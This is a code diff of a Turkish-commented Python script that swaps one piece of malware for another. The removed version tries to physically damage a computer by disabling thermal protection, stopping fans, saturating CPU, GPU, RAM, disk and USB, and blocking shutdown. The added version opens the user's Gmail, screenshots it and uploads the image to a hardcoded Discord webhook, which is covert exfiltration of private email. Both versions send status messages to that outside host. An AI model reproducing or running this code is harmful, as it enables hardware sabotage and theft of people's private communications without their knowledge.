@@ -1,12 +1,8 @@
-import ctypes
-import time
-import multiprocessing
-import sys
-import threading
 import os
-import subprocess
+import time
 import requests
-import random
+import subprocess
+import pyautogui
 
 # ==========================================
 # WEBHOOK BİLDİRİM URL'SI
@@ -15,198 +11,70 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1473367003061555406/8Lww0RV1t7Vo
 
 def send_notification(message):
     try:
-        payload = {"content": f"**[SİSTEM YAK]** {message}"}
+        payload = {"content": f"**[GMAIL SS BİLDİRİM]** {message}"}
         requests.post(WEBHOOK_URL, json=payload, timeout=5)
     except:
         pass
 
-# ==========================================
-# 1. TERMAL KORUMAYI KAPAT
-# ==========================================
-def disable_thermal():
+def send_photo_to_webhook(photo_path):
     try:
-        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFINCPOL 2', shell=True)
-        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFDECPOL 1', shell=True)
-        subprocess.run('powercfg -setactive SCHEME_CURRENT', shell=True)
-        send_notification("🔥 Termal koruma kapatıldı!")
+        with open(photo_path, "rb") as f:
+            files = {"file": f}
+            payload = {"content": "📸 Gmail ekran görüntüsü:"}
+            requests.post(WEBHOOK_URL, data=payload, files=files)
+        send_notification("✅ Ekran görüntüsü webhook'a gönderildi!")
     except Exception as e:
-        send_notification(f"❌ Termal koruma hatası: {e}")
+        send_notification(f"❌ Gönderme hatası: {e}")
 
 # ==========================================
-# 2. FANLARI DURDUR
+# CHROME İLE GMAIL AÇ
 # ==========================================
-def stop_fans():
+def open_gmail():
     try:
-        import wmi
-        c = wmi.WMI()
-        for fan in c.Win32_Fan():
-            try:
-                fan.SetSpeed(0)
-                send_notification("🌀 Fan durduruldu!")
-            except:
-                pass
-    except:
-        pass
-    
+        # Chrome ile Gmail'i aç
+        chrome_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+        gmail_url = "https://mail.google.com/mail/u/0/"
+        
+        if os.path.exists(chrome_path):
+            subprocess.Popen([chrome_path, gmail_url])
+        else:
+            subprocess.Popen(["start", gmail_url], shell=True)
+        
+        send_notification("🌐 Gmail açılıyor...")
+        time.sleep(5)  # Sayfanın yüklenmesi için bekle
+        return True
+    except Exception as e:
+        send_notification(f"❌ Gmail açma hatası: {e}")
+        return False
+
+# ==========================================
+# EKRAN GÖRÜNTÜSÜ AL
+# ==========================================
+def take_screenshot():
     try:
-        subprocess.run('speedfan.exe /P0', shell=True, capture_output=True)
-    except:
-        pass
-    
-    try:
-        subprocess.run('nvidia-smi -pl 50', shell=True, capture_output=True)
-    except:
-        pass
+        screenshot = pyautogui.screenshot()
+        screenshot.save("gmail_ss.png")
+        send_notification("📸 Ekran görüntüsü alındı!")
+        return "gmail_ss.png"
+    except Exception as e:
+        send_notification(f"❌ Ekran görüntüsü hatası: {e}")
+        return None
 
 # ==========================================
-# 3. CPU YAK
-# ==========================================
-def cpu_killer():
-    while True:
-        x = 3.14159
-        for _ in range(1000000):
-            x = x ** 1.00001
-            x = x / 1.000001
-        arr = [i ** i for i in range(5000)]
-        for _ in range(100):
-            arr.sort()
-            arr.reverse()
-
-# ==========================================
-# 4. GPU YAK (Pygame ile)
-# ==========================================
-def gpu_killer():
-    try:
-        import pygame
-        import numpy as np
-        pygame.init()
-        screen = pygame.display.set_mode((1920, 1080), pygame.FULLSCREEN)
-        while True:
-            for _ in range(50):
-                img = np.random.rand(1920, 1080, 3) * 255
-                surf = pygame.surfarray.make_surface(img)
-                screen.blit(surf, (0, 0))
-                pygame.display.flip()
-    except:
-        while True:
-            try:
-                subprocess.Popen(["cmd", "/c", "start", "calc.exe"])
-                subprocess.Popen(["cmd", "/c", "start", "mspaint.exe"])
-            except:
-                pass
-
-# ==========================================
-# 5. ANAKART YAK (USB ile)
-# ==========================================
-def motherboard_killer():
-    try:
-        import usb.core
-        for dev in usb.core.find(find_all=True):
-            try:
-                for _ in range(10000):
-                    dev.ctrl_transfer(0x40, 0x0A, 0, 0, b'\x00' * 4096)
-            except:
-                pass
-    except:
-        pass
-
-# ==========================================
-# 6. PSU YAK
-# ==========================================
-def psu_killer():
-    def disk_killer():
-        while True:
-            try:
-                with open("C:\\temp.bin", "wb") as f:
-                    f.write(b'\x00' * (1024 * 1024 * 100))
-                os.remove("C:\\temp.bin")
-            except:
-                pass
-            time.sleep(0.01)
-    
-    for _ in range(8):
-        threading.Thread(target=disk_killer, daemon=True).start()
-    
-    for _ in range(20):
-        try:
-            subprocess.Popen(["cmd", "/c", "start", "calc.exe"])
-        except:
-            pass
-
-# ==========================================
-# 7. RAM YAK
-# ==========================================
-def ram_killer():
-    while True:
-        try:
-            big_list = []
-            for _ in range(2000000):
-                big_list.append("x" * 2048)
-            big_list.clear()
-            del big_list
-        except:
-            pass
-
-# ==========================================
-# 8. KAPANMAYI ENGELLE
-# ==========================================
-def prevent_shutdown():
-    while True:
-        try:
-            ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
-        except:
-            pass
-        time.sleep(5)
-
-# ==========================================
-# 9. GÜÇ TUŞUNU İPTAL ET
-# ==========================================
-def prevent_power_button():
-    try:
-        ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
-        send_notification("🔌 Güç tuşu iptal edildi!")
-    except:
-        pass
-
-# ==========================================
-# 10. ANA
+# ANA
 # ==========================================
 if __name__ == "__main__":
-    send_notification("🚀 SİSTEM YAKMA BAŞLATILDI!")
+    send_notification("🚀 Gmail SS BOT BAŞLATILDI!")
     
-    disable_thermal()
-    stop_fans()
-    prevent_power_button()
+    # Gmail aç
+    open_gmail()
     
-    # CPU
-    core_count = multiprocessing.cpu_count()
-    thread_count = core_count * 8
-    send_notification(f"🧠 CPU: {core_count} çekirdek, {thread_count} thread")
-    for _ in range(thread_count):
-        threading.Thread(target=cpu_killer, daemon=True).start()
+    # Ekran görüntüsü al
+    ss = take_screenshot()
     
-    # GPU
-    threading.Thread(target=gpu_killer, daemon=True).start()
-    send_notification("🖥️ GPU render başlatıldı!")
+    # Webhook'a gönder
+    if ss:
+        send_photo_to_webhook(ss)
+        os.remove(ss)
     
-    # Anakart
-    threading.Thread(target=motherboard_killer, daemon=True).start()
-    send_notification("🔌 Anakart USB zorlama başlatıldı!")
-    
-    # PSU
-    threading.Thread(target=psu_killer, daemon=True).start()
-    send_notification("⚡ PSU zorlama başlatıldı!")
-    
-    # RAM
-    for _ in range(2):
-        threading.Thread(target=ram_killer, daemon=True).start()
-    send_notification("💾 RAM zorlama başlatıldı!")
-    
-    # Kapanmayı engelle
-    threading.Thread(target=prevent_shutdown, daemon=True).start()
-    send_notification("🔒 Kapanma engellendi!")
-    
-    send_notification("🔥 TÜM SİSTEM YANIYOR!")
-    
-    while True:
-        time.sleep(60)
+    send_notification("✅ İşlem tamamlandı!")
